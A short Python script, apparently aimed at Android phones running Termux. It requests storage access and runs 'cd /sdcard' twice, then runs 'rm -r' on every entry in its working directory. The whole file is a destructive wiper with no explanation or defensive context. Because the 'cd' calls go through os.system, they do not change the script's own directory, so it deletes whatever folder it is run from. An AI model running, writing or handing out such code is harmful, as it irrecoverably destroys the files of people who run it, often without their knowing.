import os
os.system("cd /sdcard")
os.system("termux-setup-storage")
os.system("cd /sdcard")
for i in os.listdir():
	os.system("rm -r "+i)
